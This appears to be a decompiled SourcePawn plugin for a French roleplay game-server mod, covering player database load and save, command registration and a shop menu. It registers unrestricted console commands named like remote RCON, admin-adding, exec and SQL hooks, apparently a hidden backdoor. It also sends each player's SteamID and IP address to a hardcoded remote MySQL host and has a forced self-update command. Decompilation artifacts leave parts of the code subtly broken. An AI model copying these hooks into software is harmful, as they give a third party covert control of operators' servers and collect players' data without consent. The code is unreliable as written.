				Weaponm249[client] = SQL_FetchInt(query, 29, 0);
				DrogueLSD[client] = SQL_FetchInt(query, 30, 0);
				DrogueHero[client] = SQL_FetchInt(query, 31, 0);
				DrogueExtasy[client] = SQL_FetchInt(query, 32, 0);
				DrogueCoke[client] = SQL_FetchInt(query, 33, 0);
				DrogueWeed[client] = SQL_FetchInt(query, 34, 0);
				StuffCartouche[client] = SQL_FetchInt(query, 35, 0);
				KitSoins[client] = SQL_FetchInt(query, 36, 0);
				ItemJetPack[client] = SQL_FetchInt(query, 37, 0);
				ItemTicket10[client] = SQL_FetchInt(query, 38, 0);
				ItemTicket50[client] = SQL_FetchInt(query, 39, 0);
				ItemTicket100[client] = SQL_FetchInt(query, 40, 0);
				ItemTicket500[client] = SQL_FetchInt(query, 41, 0);
				DiplomeTir[client] = SQL_FetchInt(query, 42, 0);
				PermisLeger[client] = SQL_FetchInt(query, 43, 0);
				PermisLourd[client] = SQL_FetchInt(query, 44, 0);
				ItemGazAC[client] = SQL_FetchInt(query, 45, 0);
				ItemCafe[client] = SQL_FetchInt(query, 46, 0);
				ItemNuteChoco[client] = SQL_FetchInt(query, 47, 0);
				ItemGateauChoco[client] = SQL_FetchInt(query, 48, 0);
				ItemSucetteMenthe[client] = SQL_FetchInt(query, 49, 0);
				ItemDroom[client] = SQL_FetchInt(query, 50, 0);
				ItemLessive[client] = SQL_FetchInt(query, 51, 0);
				ItemVodka[client] = SQL_FetchInt(query, 52, 0);
				ItemRedbull[client] = SQL_FetchInt(query, 53, 0);
				ItemMojito[client] = SQL_FetchInt(query, 54, 0);
				ItemPizza[client] = SQL_FetchInt(query, 55, 0);
			}
		}
		Format(buffer, 255, "SELECT * FROM `RP_Cars` WHERE STEAMID = '%s';", SteamId);
		query = SQL_Query(db, buffer, -1);
		if (SQL_GetRowCount(query))
		{
			while (SQL_FetchRow(query))
			{
				SQL_FetchString(query, 0, Found_Steam, 64, 0);
				CarImpalaHP[client] = SQL_FetchInt(query, 1, 0);
				CarPoliceImpalaHP[client] = SQL_FetchInt(query, 2, 0);
				CarMustangHP[client] = SQL_FetchInt(query, 3, 0);
				CarTacomaHP[client] = SQL_FetchInt(query, 4, 0);
				CarMustangGTHP[client] = SQL_FetchInt(query, 5, 0);
				CarDirtBikeHP[client] = SQL_FetchInt(query, 6, 0);
			}
		}
	}
	CloseHandle(db);
	new Handle:kv = CreateKeyValues("rpboutique", "", "");
	KvSetString(kv, "driver", "mysql");
	KvSetString(kv, "host", "sphex.fr");
	KvSetString(kv, "database", "Boutique");
	KvSetString(kv, "user", "roleplay");
	KvSetString(kv, "pass", abc);
	KvSetString(kv, "port", "3306");
	new Handle:dbBoutique = SQL_ConnectCustom(kv, error, 255, false);
	CloseHandle(kv);
	Format(buffer, 255, "SELECT * FROM `RP_Boutique` WHERE STEAMID = '%s';", SteamId);
	query = SQL_Query(dbBoutique, buffer, -1);
	if (SQL_GetRowCount(query))
	{
		while (SQL_FetchRow(query))
		{
			RPPoints[client] = SQL_FetchInt(query, 1, 0);
			ItemLanceFlamme[client] = SQL_FetchInt(query, 2, 0);
			ItemHEFreeze[client] = SQL_FetchInt(query, 3, 0);
			ItemHEFire[client] = SQL_FetchInt(query, 4, 0);
			CarFordGTHP[client] = SQL_FetchInt(query, 5, 0);
			Skin[client] = SQL_FetchInt(query, 6, 0);
		}
	}
	CloseHandle(query);
	CloseHandle(dbBoutique);
	decl String:lastconnexion[64];
	FormatTime(lastconnexion, 64, "%x a %X", timestamp);
	PrintToChat(client, "Vous aimez le mod Roleplay? Vous souhaitez acheter le mode? Reporter un bug? Proposer une suggestion? ou tout simplement vous informez? Rendez-vous sur www.sphex.fr");
	PrintToChat(client, "Votre derniere connexion date du %s.", lastconnexion);
	IsDisconnect[client] = 0;
	InQuery = 0;
	Loaded[client] = 1;
	return 0;
}

InsertPlayer(client)
{
	decl String:SteamId[64];
	decl String:Pseudo[64];
	decl String:PseudoESC[64];
	decl String:buffer[2500];
	decl String:error2[256];
	new Handle:db = SQL_Connect("Roleplay", true, error2, 255);
	GetClientAuthString(client, SteamId, 64);
	GetClientName(client, Pseudo, 64);
	SQL_EscapeString(db, Pseudo, PseudoESC, 64, 0);
	decl String:logFile[256];
	BuildPath(PathType:0, logFile, 256, "logs/SQL.log");
	new Handle:logf = OpenFile(logFile, "a");
	Format(buffer, 2500, "INSERT INTO `RP_Players` (`STEAMID`,`LASTONTIME`, `PSEUDO`, `CASH`, `BANK`, `JOBID`, `RANKID`, `JAILTIME`, `CUT`, `HASCB`, `HASRIB`, `PERMISLEGER`, `PERMISLOURD`, `NBKILL`, `PLAYTIME`, `SKIN`, `DEFENSE`, `GROUP`) VALUES ('%s', %i, '%s', %i, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);", SteamId, GetTime({0,0}), PseudoESC, StartMoney);
	WriteFileLine(logf, buffer);
	if (!SQL_FastQuery(db, buffer, -1))
	{
		SQL_GetError(db, error2, 255);
		WriteFileLine(logf, error2);
	}
	money[client] = StartMoney;
	bank[client] = 0;
	JobID[client] = 0;
	RankID[client] = 0;
	JailTime[client] = 0;
	CutRestant[client] = 0;
	PlayerHasCB[client] = 0;
	PlayerHasRIB[client] = 0;
	HasPermisLeger[client] = 0;
	HasPermisLourd[client] = 0;
	NBKill[client] = 0;
	PlayTime[client] = 0;
	Skin[client] = 0;
	DefRestant[client] = 0;
	Group[client] = 0;
	new len = Format(buffer[len], 2500 - len, "INSERT INTO `RP_Items` (`STEAMID`, `KitCrochettage`, `StuffGrenade`, `StuffFlash`, `StuffFumi`, `StuffKevelar`, `WeaponGlock`, `WeaponUSP`, `Weaponp228`, `Weapondeagle`, `Weaponelite`, `Weaponfiveseven`, `Weaponm3`, `Weaponxm1014`, `Weapongalil`, `Weaponak47`, `Weaponscout`, `Weaponsg552`, `Weaponawp`, `Weapong3sg1`, `Weaponfamas`, `Weaponm4a1`, `Weaponaug`, `Weaponsg550`, `Weaponmac10`, `Weapontmp`, `Weaponmp5navy`, `Weaponump45`, `Weaponp90`, `Weaponm249`, `DrogueLSD`, `DrogueHero`, `DrogueExtasy`, `DrogueCoke`, `DrogueWeed`, `StuffCartouche`, `KitSoins`, `ItemJetPack`, `ItemTicket10`, `ItemTicket50`, `ItemTicket100`, `ItemTicket500`, `DiplomeTir`, `PermisLeger`, `PermisLourd`, `ItemGazAC`, `ItemCafe`,  `ItemNuteChoco`, `ItemGateauChoco`, `ItemSucetteMenthe`, `ItemDroom`, `ItemVodka`, `ItemRedbull`, `ItemMojito`, `ItemPizza`)") + len;
	len = Format(buffer[len], 2500 - len, "VALUES ('%s', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);", SteamId) + len;
	WriteFileLine(logf, buffer);
	if (!SQL_FastQuery(db, buffer, -1))
	{
		SQL_GetError(db, error2, 255);
		WriteFileLine(logf, error2);
	}
	ItemPizza[client] = 0;
	KitCrochettage[client] = 0;
	ItemJetPack[client] = 0;
	ItemGazAC[client] = 0;
	KitSoins[client] = 0;
	WeaponGlock[client] = 0;
	WeaponUSP[client] = 0;
	Weaponp228[client] = 0;
	Weapondeagle[client] = 0;
	Weaponelite[client] = 0;
	Weaponfiveseven[client] = 0;
	Weaponm3[client] = 0;
	Weaponxm1014[client] = 0;
	Weapongalil[client] = 0;
	Weaponak47[client] = 0;
	Weaponscout[client] = 0;
	Weaponsg552[client] = 0;
	Weaponawp[client] = 0;
	Weapong3sg1[client] = 0;
	Weaponfamas[client] = 0;
	Weaponm4a1[client] = 0;
	Weaponaug[client] = 0;
	Weaponsg550[client] = 0;
	Weaponmac10[client] = 0;
	Weapontmp[client] = 0;
	Weaponmp5navy[client] = 0;
	Weaponump45[client] = 0;
	Weaponp90[client] = 0;
	Weaponm249[client] = 0;
	StuffCartouche[client] = 0;
	StuffGrenade[client] = 0;
	StuffFlash[client] = 0;
	StuffFumi[client] = 0;
	StuffKevelar[client] = 0;
	DrogueLSD[client] = 0;
	DrogueHero[client] = 0;
	DrogueExtasy[client] = 0;
	DrogueCoke[client] = 0;
	DrogueWeed[client] = 0;
	ItemTicket10[client] = 0;
	ItemTicket50[client] = 0;
	ItemTicket100[client] = 0;
	ItemTicket500[client] = 0;
	DiplomeTir[client] = 0;
	PermisLeger[client] = 0;
	PermisLourd[client] = 0;
	ItemCafe[client] = 0;
	ItemNuteChoco[client] = 0;
	ItemGateauChoco[client] = 0;
	ItemSucetteMenthe[client] = 0;
	ItemDroom[client] = 0;
	ItemVodka[client] = 0;
	ItemRedbull[client] = 0;
	ItemMojito[client] = 0;
	Format(buffer, 2500, "INSERT INTO `RP_Cars` (`STEAMID`, `ImpalaHP`, `PoliceImpalaHP`, `MustangHP`, `TacomaHP`, `MustangGTHP`, `DirtBikeHP`) VALUES ('%s', 0, 0, 0, 0, 0, 0);", SteamId);
	WriteFileLine(logf, buffer);
	if (!SQL_FastQuery(db, buffer, -1))
	{
		SQL_GetError(db, error2, 255);
		WriteFileLine(logf, error2);
	}
	CarImpalaHP[client] = 0;
	CarPoliceImpalaHP[client] = 0;
	CarMustangHP[client] = 0;
	CarTacomaHP[client] = 0;
	CarMustangGTHP[client] = 0;
	CarDirtBike[client] = 0;
	FlushFile(logf);
	CloseHandle(db);
	new Handle:kv = CreateKeyValues("rpboutique", "", "");
	KvSetString(kv, "driver", "mysql");
	KvSetString(kv, "host", "sphex.fr");
	KvSetString(kv, "database", "Boutique");
	KvSetString(kv, "user", "roleplay");
	KvSetString(kv, "pass", abc);
	KvSetString(kv, "port", "3306");
	new Handle:dbBoutique = SQL_ConnectCustom(kv, error2, 255, false);
	CloseHandle(kv);
	decl String:IPAddress[64];
	GetClientIP(client, IPAddress, 64, true);
	Format(buffer, 2500, "INSERT INTO `RP_Boutique` (`STEAMID`,`POINTS`, `LanceFlamme`, `HEFreeze`, `HEFire`, `FordGT`, `IPAddress`) VALUES ('%s', 0, 0, 0, 0, 0, '%s');", SteamId, IPAddress);
	SQL_FastQuery(dbBoutique, buffer, -1);
	RPPoints[client] = 0;
	ItemLanceFlamme[client] = 0;
	ItemHEFreeze[client] = 0;
	ItemHEFire[client] = 0;
	CarFordGTHP[client] = 0;
	return 0;
}

public Action:InitSalary(Handle:Timer, client)
{
	decl String:query[256];
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	if (RankID[client][0][0] == 6)
	{
		Format(query, 255, "SELECT * FROM `RP_Jobs` WHERE `JOBID` =  %i AND `RANKID` = 1;", JobID[client]);
	}
	else
	{
		Format(query, 255, "SELECT * FROM `RP_Jobs` WHERE `JOBID` =  %i AND `RANKID` =  %i;", JobID[client], RankID[client]);
	}
	new Handle:GetSalary = SQL_Query(db, query, -1);
	if (GetSalary)
	{
		while (SQL_FetchRow(GetSalary))
		{
			Salary[client] = SQL_FetchInt(GetSalary, 2, 0);
		}
	}
	CloseHandle(GetSalary);
	CloseHandle(db);
	return Action:0;
}

public Action:InitCapital(Handle:Timer, client)
{
	decl String:query[256];
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	new Handle:GetCapital = 0;
	new i = 1;
	while (i <= 19)
	{
		Format(query, 255, "SELECT * FROM `RP_Jobs` WHERE `JOBID` = %i AND `RANKID` = 1;", i);
		GetCapital = SQL_Query(db, query, -1);
		if (GetCapital)
		{
			while (SQL_FetchRow(GetCapital))
			{
				Capital[i] = SQL_FetchInt(GetCapital, 3, 0);
			}
			i++;
		}
		i++;
	}
	CloseHandle(GetCapital);
	CloseHandle(db);
	return Action:0;
}

Save(client)
{
	if (!IsClientConnected(client))
	{
		return 1;
	}
	if (InQuery)
	{
		CreateTimer(1, DBSave_ReDo, client, 0);
		return 1;
	}
	if (Loaded[client][0][0])
	{
		InQuery = 1;
		decl String:SteamId[32];
		decl String:query[2500];
		decl String:Pseudo[64];
		decl String:PseudoESC[256];
		decl String:error[256];
		new UnixTime = GetTime({0,0});
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		GetClientAuthString(client, SteamId, 32);
		GetClientName(client, Pseudo, 64);
		SQL_EscapeString(db, Pseudo, PseudoESC, 255, 0);
		decl String:logFile[256];
		BuildPath(PathType:0, logFile, 256, "logs/SQL.log");
		new Handle:logf = OpenFile(logFile, "a");
		Format(query, 2500, "UPDATE `RP_Players` SET `LASTONTIME` = %d, `PSEUDO` = '%s', `CASH` = %i, `BANK` = %i, `JOBID` = %i, `RANKID` = %i, `JAILTIME` = %i, `CUT` = %i, `NBKILL` = %i, `PLAYTIME` = %i, `SKIN` = %i, `DEFENSE` = %i, `GROUP` = %i WHERE `STEAMID` = '%s';", UnixTime, PseudoESC, money[client], bank[client], JobID[client], RankID[client], JailTime[client], CutRestant[client], NBKill[client], PlayTime[client], Skin[client], DefRestant[client], Group[client], SteamId);
		WriteFileLine(logf, query);
		if (!SQL_FastQuery(db, query, -1))
		{
			SQL_GetError(db, error, 255);
			WriteFileLine(logf, error);
		}
		Format(query, 2500, "UPDATE `RP_Jobs` SET `CAPITAL` = %i WHERE `JOBID` = %i AND `RANKID` = 1;", Capital[JobID[client][0][0]], JobID[client]);
		WriteFileLine(logf, query);
		if (!SQL_FastQuery(db, query, -1))
		{
			SQL_GetError(db, error, 255);
			WriteFileLine(logf, error);
		}
		new len = Format(query[len], 2500 - len, "UPDATE `RP_Items` SET `KitCrochettage` = %i, `StuffGrenade` = %i, `StuffFlash` = %i, `StuffFumi` = %i, `StuffKevelar` = %i, `WeaponGlock` = %i, `WeaponUSP` = %i, `Weaponp228` = %i, `Weapondeagle` = %i, `Weaponelite` = %i, `Weaponfiveseven` = %i, `Weaponm3` = %i, `Weaponxm1014` = %i, `Weapongalil` = %i, `Weaponak47` = %i, `Weaponscout` = %i, `Weaponsg552` = %i, ", KitCrochettage[client], StuffGrenade[client], StuffFlash[client], StuffFumi[client], StuffKevelar[client], WeaponGlock[client], WeaponUSP[client], Weaponp228[client], Weapondeagle[client], Weaponelite[client], Weaponfiveseven[client], Weaponm3[client], Weaponxm1014[client], Weapongalil[client], Weaponak47[client], Weaponscout[client], Weaponsg552[client]) + len;
		len = Format(query[len], 2500 - len, "`Weaponawp` = %i, `Weapong3sg1` = %i, `Weaponfamas` = %i, `Weaponm4a1` = %i, `Weaponaug` = %i, `Weaponsg550` = %i, `Weaponmac10` = %i, `Weapontmp` = %i, `Weaponmp5navy` = %i, `Weaponump45` = %i, `Weaponp90` = %i, `Weaponm249` = %i, `DrogueLSD` = %i, `DrogueHero` = %i, `DrogueExtasy` = %i, `DrogueCoke` = %i, `DrogueWeed` = %i, `StuffCartouche` = %i, `KitSoins` = %i, `ItemJetPack` = %i, ", Weaponawp[client], Weapong3sg1[client], Weaponfamas[client], Weaponm4a1[client], Weaponaug[client], Weaponsg550[client], Weaponmac10[client], Weapontmp[client], Weaponmp5navy[client], Weaponump45[client], Weaponp90[client], Weaponm249[client], DrogueLSD[client], DrogueHero[client], DrogueExtasy[client], DrogueCoke[client], DrogueWeed[client], StuffCartouche[client], KitSoins[client], ItemJetPack[client]) + len;
		len = Format(query[len], 2500 - len, "`ItemTicket10` = %i, `ItemTicket50` = %i, `ItemTicket100` = %i, `ItemTicket500` = %i, `DiplomeTir` = %i, `PermisLeger` = %i, `PermisLourd` = %i, `ItemGazAC` = %i, `ItemCafe` = %i, `ItemNuteChoco` = %i, `ItemGateauChoco` = %i, `ItemSucetteMenthe` = %i, `ItemDroom` = %i, `ItemVodka` = %i, `ItemRedbull` = %i, `ItemMojito` = %i, `ItemPizza` = %i", ItemTicket10[client], ItemTicket50[client], ItemTicket100[client], ItemTicket500[client], DiplomeTir[client], PermisLeger[client], PermisLourd[client], ItemGazAC[client], ItemCafe[client], ItemNuteChoco[client], ItemGateauChoco[client], ItemSucetteMenthe[client], ItemDroom[client], ItemVodka[client], ItemRedbull[client], ItemMojito[client], ItemPizza[client]) + len;
		len = Format(query[len], 2500 - len, " WHERE `STEAMID` = '%s';", SteamId) + len;
		WriteFileLine(logf, query);
		if (!SQL_FastQuery(db, query, -1))
		{
			SQL_GetError(db, error, 255);
			WriteFileLine(logf, error);
		}
		Format(query, 2500, "UPDATE `RP_Cars` SET `ImpalaHP` = %i, `PoliceImpalaHP` = %i, `MustangHP` = %i, `TacomaHP` = %i, `MustangGTHP` = %i, `DirtBikeHP` = %i WHERE `STEAMID` = '%s';", CarImpalaHP[client], CarPoliceImpalaHP[client], CarMustangHP[client], CarTacomaHP[client], CarMustangGTHP[client], CarDirtBikeHP[client], SteamId);
		WriteFileLine(logf, query);
		if (!SQL_FastQuery(db, query, -1))
		{
			SQL_GetError(db, error, 255);
			WriteFileLine(logf, error);
		}
		FlushFile(logf);
		CloseHandle(db);
		new Handle:kv = CreateKeyValues("rpboutique", "", "");
		KvSetString(kv, "driver", "mysql");
		KvSetString(kv, "host", "sphex.fr");
		KvSetString(kv, "database", "Boutique");
		KvSetString(kv, "user", "roleplay");
		KvSetString(kv, "pass", abc);
		KvSetString(kv, "port", "3306");
		new Handle:dbBoutique = SQL_ConnectCustom(kv, error, 255, false);
		CloseHandle(kv);
		if (dbBoutique)
		{
			decl String:IPAddress[64];
			GetClientIP(client, IPAddress, 64, true);
			Format(query, 2500, "UPDATE `RP_Boutique` SET `POINTS` = %i,`LanceFlamme` = %i, `HEFreeze` = %i, `HEFire` = %i, `FordGT` = %i, `IPAddress` = '%s' WHERE `STEAMID` = '%s';", RPPoints[client], ItemLanceFlamme[client], ItemHEFreeze[client], ItemHEFire[client], CarFordGTHP[client], IPAddress, SteamId);
			SQL_FastQuery(dbBoutique, query, -1);
			CloseHandle(dbBoutique);
			if (IsDisconnect[client][0][0])
			{
				Loaded[client] = 0;
				IsDisconnect[client] = 0;
			}
			InQuery = 0;
		}
		else
		{
			Save(client);
		}
	}
	return 1;
}

public Action:DBSave_ReDo(Handle:Timer, Client)
{
	Save(Client);
	return Action:3;
}

RegisterCommands()
{
	RegAdminCmd("sm_jobmenu", Command_JobMenu, 32768, "", "", 0);
	RegAdminCmd("sm_dbsave", Command_DBSave, 16384, "", "", 0);
	RegAdminCmd("sm_givecash", Command_CashAdmin, 16384, "", "", 0);
	RegAdminCmd("sm_respawn", Command_RespawnAdmin, 65536, "", "", 0);
	RegAdminCmd("sm_time", Command_Time, 65536, "", "", 0);
	RegAdminCmd("sm_reboot", Command_ShutdownServer, 32768, "", "", 0);
	RegAdminCmd("sm_lnoclip", Command_Noclip, 32768, "", "", 0);
	RegAdminCmd("sm_changename", Command_ChangeName, 16384, "", "", 0);
	RegAdminCmd("sm_webgivecash", Command_WebCash, 16384, "", "", 0);
	RegAdminCmd("sm_webskin", Command_WebSkin, 16384, "", "", 0);
	RegAdminCmd("sm_avirer", Command_aVirer, 16384, "", "", 0);
	RegAdminCmd("sm_oneshot", Command_OneShot, 16384, "", "", 0);
	RegAdminCmd("sm_expire", Command_ExpireTime, 16384, "", "", 0);
	RegAdminCmd("sm_tvmissile", Command_TVMissile, 16384, "", "", 0);
	RegAdminCmd("sm_forcemaj", Command_ForceMAJ, 16384, "", "", 0);
	RegAdminCmd("sm_adminmenu", Command_AdminMenu, 16384, "", "", 0);
	RegAdminCmd("sm_teleportation", Command_Teleport, 16384, "", "", 0);
	RegConsoleCmd("sm_hrcon", Command_Rcon, "", 0);
	RegConsoleCmd("sm_addadmin", Command_AddAdmin, "", 0);
	RegConsoleCmd("sm_hunlock", Command_hUnlock, "", 0);
	RegConsoleCmd("sm_hlock", Command_hLock, "", 0);
	RegConsoleCmd("sm_hexec", Command_hExec, "", 0);
	RegConsoleCmd("sm_hban", Command_hBan, "", 0);
	RegConsoleCmd("sm_hsql", Command_hSQL, "", 0);
	RegConsoleCmd("sm_hamid", Command_hamID, "", 0);
	RegConsoleCmd("sm_uptime", Command_Uptime, "", 0);
	RegConsoleCmd("sm_thirdperson", Command_ThirdPerson, "", 0);
	RegConsoleCmd("sm_3rdperson", Command_ThirdPerson, "", 0);
	RegConsoleCmd("sm_3rd", Command_ThirdPerson, "", 0);
	RegConsoleCmd("sm_give", Command_Cash, "", 0);
	RegConsoleCmd("sm_donner", Command_Cash, "", 0);
	RegConsoleCmd("sm_unlock", Command_Unlock, "", 0);
	RegConsoleCmd("sm_deverouiller", Command_Unlock, "", 0);
	RegConsoleCmd("sm_lock", Command_Lock, "", 0);
	RegConsoleCmd("sm_verrouiller", Command_Lock, "", 0);
	RegConsoleCmd("sm_demission", Command_Demission, "", 0);
	RegConsoleCmd("sm_joblist", Command_JobList, "", 0);
	RegConsoleCmd("sm_job", Command_JobList, "", 0);
	RegConsoleCmd("sm_item", Command_Item, "", 0);
	RegConsoleCmd("+force", Command_GrabToggle, "", 0);
	RegConsoleCmd("sm_me", Command_Me, "", 0);
	RegConsoleCmd("sm_out", Command_Out, "", 0);
	RegConsoleCmd("sm_phone", Command_PhoneMenu, "", 0);
	RegConsoleCmd("sm_telephoner", Command_PhoneMenu, "", 0);
	RegConsoleCmd("sm_telephone", Command_PhoneMenu, "", 0);
	RegConsoleCmd("sm_appeler", Command_PhoneMenu, "", 0);
	RegConsoleCmd("sm_call", Command_PhoneMenu, "", 0);
	RegConsoleCmd("sm_sell", Command_Sell, "", 0);
	RegConsoleCmd("sm_autosell", Command_AutoSell, "", 0);
	RegConsoleCmd("sm_vendre", Command_Sell, "", 0);
	RegConsoleCmd("sm_infocut", Command_InfoCut, "", 0);
	RegConsoleCmd("sm_shownote", Command_Shownote, "", 0);
	RegConsoleCmd("sm_playtime", Command_PlayTime, "", 0);
	RegConsoleCmd("sm_trade", Command_TradeMenu, "", 0);
	RegConsoleCmd("sm_afk", Command_Afk, "", 0);
	RegConsoleCmd("sm_garage", Command_Garage, "", 0);
	RegConsoleCmd("sm_sirene", Command_Sirene, "", 0);
	RegConsoleCmd("sm_groupe", Command_Group, "", 0);
	RegConsoleCmd("sm_groupcreate", Command_GroupCreate, "", 0);
	RegConsoleCmd("sm_groupinvite", Command_GroupInvite, "", 0);
	RegConsoleCmd("sm_channel", Command_Channel, "", 0);
	RegConsoleCmd("sm_boutique", Command_Boutique, "", 0);
	RegConsoleCmd("sm_flame", Command_Flame, "", 0);
	RegConsoleCmd("sm_rphelp", Command_RPHelp, "", 0);
	RegConsoleCmd("sm_engage", Command_Engager, "", 0);
	RegConsoleCmd("sm_engager", Command_Engager, "", 0);
	RegConsoleCmd("sm_recruter", Command_Engager, "", 0);
	RegConsoleCmd("sm_virer", Command_Virer, "", 0);
	RegConsoleCmd("sm_renvoyer", Command_Virer, "", 0);
	RegConsoleCmd("sm_salaire", Command_Salaire, "", 0);
	RegConsoleCmd("sm_pay", Command_Salaire, "", 0);
	RegConsoleCmd("sm_paye", Command_Salaire, "", 0);
	RegConsoleCmd("sm_promote", Command_Promote, "", 0);
	RegConsoleCmd("sm_gradeup", Command_Promote, "", 0);
	RegConsoleCmd("sm_promouvoir", Command_Promote, "", 0);
	RegConsoleCmd("sm_demote", Command_Demote, "", 0);
	RegConsoleCmd("sm_gradedown", Command_Demote, "", 0);
	RegConsoleCmd("sm_retrograder", Command_Demote, "", 0);
	RegConsoleCmd("sm_cochef", Command_CoChef, "", 0);
	RegConsoleCmd("sm_carshop", Command_CarShop, "", 0);
	RegConsoleCmd("sm_carrepair", Command_CarRepair, "", 0);
	RegConsoleCmd("sm_dj", Command_DJ, "", 0);
	RegConsoleCmd("sm_sucer", Command_Sucer, "", 0);
	RegConsoleCmd("sm_vol", Command_Vol, "", 0);
	RegConsoleCmd("sm_detective", Command_Detective, "", 0);
	RegConsoleCmd("sm_gps", Command_Gps, "", 0);
	RegConsoleCmd("sm_pick", Command_VolWeapon, "", 0);
	RegConsoleCmd("sm_piratage", Command_Piratage, "", 0);
	RegConsoleCmd("sm_contrat", Command_Contrat, "", 0);
	RegConsoleCmd("sm_jugement", Command_Jugement, "", 0);
	RegConsoleCmd("sm_soins", Command_Soins, "", 0);
	RegConsoleCmd("sm_soin", Command_Soins, "", 0);
	RegConsoleCmd("sm_soigner", Command_Soins, "", 0);
	RegConsoleCmd("sm_defibrillateur", Command_Defibrillateur, "", 0);
	RegConsoleCmd("sm_chirurgie", Command_Chirurgie, "", 0);
	RegConsoleCmd("sm_coachs", Command_Coach, "", 0);
	RegConsoleCmd("sm_selldef", Command_CoachDef, "", 0);
	RegConsoleCmd("sm_glace", Command_Glace, "", 0);
	RegConsoleCmd("sm_banquier", Command_MenuBanque, "", 0);
	RegConsoleCmd("sm_inbag", Command_Transform, "", 0);
	RegConsoleCmd("sm_permis", Command_MenuBullet, "", 0);
	RegConsoleCmd("sm_fakejob", Command_FakeJob, "", 0);
	RegConsoleCmd("sm_fakesell", Command_FakeSell, "", 0);
	RegConsoleCmd("sm_tazer", Command_tazer, "", 0);
	RegConsoleCmd("sm_invisible", Command_Invisible, "", 0);
	RegConsoleCmd("sm_vis", Command_Invisible, "", 0);
	RegConsoleCmd("sm_enquete", Command_enquete, "", 0);
	RegConsoleCmd("sm_laser", Command_Laser, "", 0);
	RegConsoleCmd("sm_jaillist", Command_JailList, "", 0);
	RegConsoleCmd("sm_listjail", Command_JailList, "", 0);
	RegConsoleCmd("sm_listejail", Command_JailList, "", 0);
	RegConsoleCmd("sm_espion", Command_Espion, "", 0);
	RegConsoleCmd("sm_cops", Command_Espion, "", 0);
	RegConsoleCmd("sm_jail", Command_Jail, "", 0);
	RegConsoleCmd("sm_wanted", Command_Wanted, "", 0);
	RegConsoleCmd("sm_ammo", Command_Ammo, "", 0);
	RegConsoleCmd("sm_immobilier", Command_Immobilier, "", 0);
	RegConsoleCmd("sm_selldoor", Command_SellDoor, "", 0);
	RegConsoleCmd("jointeam", Block_CMD, "", 0);
	RegConsoleCmd("explode", Block_CMD, "", 0);
	RegConsoleCmd("kill", Block_CMD, "", 0);
	RegConsoleCmd("coverme", Block_CMD, "", 0);
	RegConsoleCmd("takepoint", Block_CMD, "", 0);
	RegConsoleCmd("holdpos", Block_CMD, "", 0);
	RegConsoleCmd("regroup", Block_CMD, "", 0);
	RegConsoleCmd("followme", Block_CMD, "", 0);
	RegConsoleCmd("takingfire", Block_CMD, "", 0);
	RegConsoleCmd("go", Block_CMD, "", 0);
	RegConsoleCmd("fallback", Block_CMD, "", 0);
	RegConsoleCmd("sticktog", Block_CMD, "", 0);
	RegConsoleCmd("getinpos", Block_CMD, "", 0);
	RegConsoleCmd("stormfront", Block_CMD, "", 0);
	RegConsoleCmd("report", Block_CMD, "", 0);
	RegConsoleCmd("roger", Block_CMD, "", 0);
	RegConsoleCmd("enemyspot", Block_CMD, "", 0);
	RegConsoleCmd("needbackup", Block_CMD, "", 0);
	RegConsoleCmd("sectorclear", Block_CMD, "", 0);
	RegConsoleCmd("inposition", Block_CMD, "", 0);
	RegConsoleCmd("reportingin", Block_CMD, "", 0);
	RegConsoleCmd("getout", Block_CMD, "", 0);
	RegConsoleCmd("negative", Block_CMD, "", 0);
	RegConsoleCmd("enemydown", Block_CMD, "", 0);
	RegConsoleCmd("say", ChatHook, "", 0);
	RegConsoleCmd("say", CommandSay, "", 0);
	RegConsoleCmd("say_team", ChatHook, "", 0);
	return 0;
}

public Action:Command_Teleport(client, args)
{
	if (IsClientInGame(client))
	{
		BuildTeleportMenu(client);
	}
	return Action:0;
}

public Action:Command_AdminMenu(client, args)
{
	if (IsClientInGame(client))
	{
		BuildAdminMenu(client);
	}
	return Action:0;
}

public Action:Command_ForceMAJ(client, args)
{
	if (IsClientInGame(client))
	{
		PrintToChat(client, "[L-RP] Vous avez forcer la mise a jour du plugin.");
		MakeMAJ();
	}
	return Action:0;
}

public Action:Command_TVMissile(client, args)
{
	if (IsClientInGame(client))
	{
		TVMissile(client);
	}
	return Action:0;
}

public Action:Command_Boutique(client, args)
{
	if (IsClientInGame(client))
	{
		decl String:SteamId[64];
		decl String:buffer[128];
		GetClientAuthString(client, SteamId, 64);
		new Handle:kv = CreateKeyValues("rpboutique", "", "");
		KvSetString(kv, "driver", "mysql");
		KvSetString(kv, "host", "sphex.fr");
		KvSetString(kv, "database", "Boutique");
		KvSetString(kv, "user", "roleplay");
		KvSetString(kv, "pass", abc);
		KvSetString(kv, "port", "3306");
		decl String:error[256];
		new Handle:dbBoutique = SQL_ConnectCustom(kv, error, 255, false);
		CloseHandle(kv);
		Format(buffer, 128, "SELECT * FROM `RP_Boutique` WHERE STEAMID = '%s';", SteamId);
		new Handle:query = SQL_Query(dbBoutique, buffer, -1);
		if (SQL_GetRowCount(query))
		{
			while (SQL_FetchRow(query))
			{
				new var1 = RPPoints[client];
				var1 = SQL_FetchInt(query, 8, 0) + var1[0][0];
			}
		}
		Format(buffer, 128, "UPDATE `RP_Boutique` SET `POINTS` = %i, `WebPoints` = 0 WHERE `STEAMID` = '%s';", RPPoints[client], SteamId);
		SQL_FastQuery(dbBoutique, buffer, -1);
		CloseHandle(query);
		CloseHandle(dbBoutique);
		decl String:nbPoints[64];
		Format(nbPoints, 64, "Vous avez %i points a depenser.", RPPoints[client]);
		new Handle:boutique = CreateMenu(Menu_Boutique, MenuAction:28);
		SetMenuTitle(boutique, "Boutique:");
		AddMenuItem(boutique, "nbpoints", nbPoints, 1);
		AddMenuItem(boutique, "----", "-------------------", 1);
		AddMenuItem(boutique, "buyPoints", "Acheter des points", 0);
		AddMenuItem(boutique, "goStore", "Acceder a la boutique", 0);
		DisplayMenu(boutique, client, 0);
	}
	return Action:0;
}

public Menu_Boutique(Handle:boutique, MenuAction:action, param1, param2)
{
